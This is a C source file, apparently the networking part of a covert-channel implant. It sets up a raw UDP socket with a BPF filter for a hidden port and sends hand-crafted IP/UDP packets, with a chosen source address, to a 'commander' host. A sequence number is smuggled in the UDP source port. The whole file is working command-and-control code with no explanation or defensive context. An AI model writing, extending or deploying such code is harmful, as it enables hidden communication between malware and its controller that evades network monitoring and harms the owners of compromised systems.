#include "network.h"

#include <arpa/inet.h>
#include <errno.h>
#include <linux/filter.h>
#include <linux/socket.h>
#include <linux/if_ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>


#define PKT_MAX_LEN 4096
#define IP_VERSION 4
#define IP_IHL 5             // 5 * 32-bit words = 20 bytes
#define IP_FRAG_OFF 0
#define IP_HDR_TOS 0
#define IP_HDR_TTL 64

int setup_covert_fd() {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (fd == -1) {
        fprintf(stderr, "covert socket() failed\n");
        return -1;
    }

    int one = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "setsockopt(IPPROTO_IP, IP_HDRINCL) failed\n");
        return -1;
    }

    struct sock_filter code[] = {

        BPF_STMT(BPF_LD  | BPF_B | BPF_ABS, 9),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, IPPROTO_UDP, 0, 5),

        BPF_STMT(BPF_LD  | BPF_B | BPF_ABS, 0),
        BPF_STMT(BPF_ALU | BPF_AND | BPF_K, 0x0F),
        BPF_STMT(BPF_ALU | BPF_LSH | BPF_K, 2),

        BPF_STMT(BPF_LD  | BPF_H | BPF_IND, 2),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, COVERT_CHAN, 0, 1),

        BPF_STMT(BPF_RET | BPF_K, 0xFFFFFFFF),
        BPF_STMT(BPF_RET | BPF_K, 0),
    };

    struct sock_fprog bpf = {
        .len = sizeof(code) / sizeof(code[0]),
        .filter = code,
    };

    if (setsockopt(fd, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf)) < 0) {
        fprintf(stderr, "setsockopt(SO_ATTACH_FILTER) failed\n");
        return -1;
    }

    return fd;
}

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;

    for (; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short) (~sum);
}

int send_packet(struct Context *ctx, const char *ip_src_addr) {
    uint16_t *udp_src_port = &ctx->cmd_seq_num;

    uint8_t packet[PKT_MAX_LEN];

    struct iphdr *ip = (struct iphdr *)packet;
    ip->ihl = IP_IHL;
    ip->version = IP_VERSION;
    ip->tos = IP_HDR_TOS;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr));
    ip->id = htons((uint16_t)rand());
    ip->frag_off = IP_FRAG_OFF;
    ip->ttl = IP_HDR_TTL;
    ip->protocol = IPPROTO_UDP;
    ip->saddr = inet_addr(ip_src_addr);
    ip->daddr = inet_addr(ctx->commander_ip);
    ip->check = checksum(ip, sizeof(struct iphdr));
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    udp->source = htons(*udp_src_port);
    udp->dest = htons(COVERT_CHAN);
    udp->len = htons(sizeof(struct udphdr));
    udp->check = 0;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = udp->dest;
    dest.sin_addr.s_addr = ip->daddr;

    sendto(ctx->covert_fd, packet, sizeof(struct iphdr)+sizeof(struct udphdr), 0, (struct sockaddr *)&dest, sizeof(dest));
    (*udp_src_port)++;

    return 0;
}